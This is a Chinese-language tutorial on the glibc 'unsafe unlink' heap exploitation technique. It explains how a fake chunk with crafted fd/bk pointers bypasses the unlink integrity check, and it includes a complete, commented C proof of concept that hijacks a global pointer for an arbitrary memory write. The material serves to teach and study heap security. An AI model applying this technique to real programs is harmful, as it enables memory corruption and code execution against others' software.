# 漏洞利用文档：Unsafe Unlink

## 攻击对象
全局指针 `chunk0_ptr`（位于地址 `0x602078`），该指针指向堆上的 `chunk0`（用户数据区域地址 `0x603010`）。通过 unlink 操作修改此指针，实现任意内存写。攻击针对堆元数据（如 `size` 位、`previous_size` 和 `PREV_INUSE` 位）以及全局指针所在的内存区域。

## 利用过程
1. **分配堆块**：分配两个大 chunk（`chunk0` 和 `chunk1`），大小设置为 `0x420` 以避免使用 tcache 或 fastbin。
2. **构造 Fake Chunk**：在 `chunk0` 内部构造一个 fake chunk，设置其 `size` 为 `chunk0` 的原始 size 减 `0x10`，并精心设置 `fd` 和 `bk` 指针指向 `chunk0_ptr` 附近地址，以绕过 glibc 的 unlink 安全检查。
3. **篡改元数据**：通过堆溢出修改 `chunk1` 的 `previous_size` 为 `0x420`（而非正常的 `0x430`），并清除 `chunk1` 的 `PREV_INUSE` 位，标记前一个 chunk（即 fake chunk）为 free 状态。
4. **触发 Unlink**：释放 `chunk1`，触发 consolidate backward，导致 unlink 操作 on fake chunk。unlink 操作修改 `chunk0_ptr` 的值，使其指向 fake chunk 的 `fd` 值（`0x602060`）。
5. **任意内存写**：利用修改后的 `chunk0_ptr` 重定向其指向任意地址（如栈上的 `victim_string`），并通过写入操作实现任意内存修改。

## 利用条件
- **全局指针存在**：程序中存在一个全局指针（如 `chunk0_ptr`）指向堆内存区域，且该指针的位置已知。
- **堆溢出漏洞**：存在堆溢出漏洞，允许覆盖相邻 chunk（如 `chunk1`）的元数据（`previous_size` 和 `size` 位）。
- **控制 fake chunk**：能控制 fake chunk 的构造，包括设置 `size`、`fd` 和 `bk` 指针，以绕过 unlink 安全检查。
- **内存布局知识**：需要知道全局指针的地址和堆布局，以正确计算 `fd` 和 `bk` 的偏移。

## 利用效果
- **任意内存写**：通过修改 `chunk0_ptr`，获得任意地址写入能力，可以覆盖关键数据（如函数指针、返回地址或字符串）。
- **控制流劫持**：结合任意内存写，可能劫持控制流（例如，修改 GOT 表或栈上的返回地址），执行任意代码。
- **数据泄露或篡改**：可以读取或修改敏感数据，导致信息泄露或程序行为异常。

## 涉及缓解机制
glibc 的 unlink 操作包含安全检查，以防止恶意 unlink。相关源码或伪代码基于 glibc 的 `unlink_chunk` 函数（参考 commit: 1ecba1fafc160ca70f81211b23f688df8676e612）：

```c
// 伪代码：unlink_chunk 中的安全检查
if (__builtin_expect (chunk->fd->bk != chunk || chunk->bk->fd != chunk, 0))
  malloc_printerr ("corrupted double-linked list");
```

- **检查机制**：unlink 时验证 `P->fd->bk == P` 和 `P->bk->fd == P`，确保 chunk 在双向链表中的一致性。
- **绕过方法**：通过构造 fake chunk，使 `P->fd` 指向 `&chunk0_ptr - 0x18`，`P->bk` 指向 `&chunk0_ptr - 0x10`，从而 `P->fd->bk` 和 `P->bk->fd` 都计算为 `P`，绕过检查。
- **额外检查**：glibc 还有其他检查（如 size 对齐），但在此利用中通过设置 fake size 为 `0x421`（对齐）来避免触发。

## Proof of Concept
以下为漏洞利用原型源码，添加了中文注释解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr; // 全局指针，指向 chunk0 的用户数据区域

int main()
{
    setbuf(stdout, NULL);
    printf("Welcome to unsafe unlink 2.0!\n");
    printf("Tested in Ubuntu 20.04 64bit.\n");
    printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x420; // 分配大小，选择较大的值以避免使用 tcache 或 fastbin（便于利用）
    int header_size = 2; // chunk 头部大小（以 uint64_t 为单位），在 64 位系统中通常为 2*8=16 字节

    printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); // 分配 chunk0，chunk0_ptr 指向其用户数据区域
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); // 分配 chunk1，作为 victim chunk
    printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    printf("We create a fake chunk inside chunk0.\n");
    printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");
    chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; // 设置 fake chunk 的 size：chunk0 的原始 size（位于 chunk0_ptr[-1]）减 0x10，以绕过 size 检查
    printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); // 设置 fake chunk 的 fd 指针：指向 &chunk0_ptr - 0x18，使得 P->fd->bk 计算为 P
    printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); // 设置 fake chunk 的 bk 指针：指向 &chunk0_ptr - 0x10，使得 P->bk->fd 计算为 P
    printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

    printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size; // 获取 chunk1 的头部地址（previous_size 和 size 字段）
    printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
    chunk1_hdr[0] = malloc_size; // 修改 chunk1 的 previous_size 为 0x420（而非正常的 0x430），使 free 认为 fake chunk 是 chunk0 的起始
    printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
    chunk1_hdr[1] &= ~1; // 清除 chunk1 size 字段的 PREV_INUSE 位（最低位），标记前一个 chunk（fake chunk）为 free 状态

    printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    printf("You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n");
    free(chunk1_ptr); // 释放 chunk1，触发 consolidate backward，执行 unlink 操作 on fake chunk，修改 chunk0_ptr 为 fake chunk 的 fd 值（0x602060）

    printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~"); // 定义一个栈上的字符串作为写入目标
    chunk0_ptr[3] = (uint64_t) victim_string; // 利用 chunk0_ptr 的当前指向（0x602060）修改其值，使 chunk0_ptr 指向 victim_string

    printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
    printf("Original value: %s\n",victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL; // 通过 chunk0_ptr 写入任意数据到 victim_string
    printf("New Value: %s\n",victim_string);

    // sanity check
    assert(*(long *)victim_string == 0x4141414142424242L); // 验证写入成功：victim_string 内容被修改
}
```

此 PoC 演示了如何通过 unsafe unlink 实现全局指针劫持和任意内存写入。关键步骤包括 fake chunk 构造、元数据篡改和 unlink 触发，最终修改栈上的数据。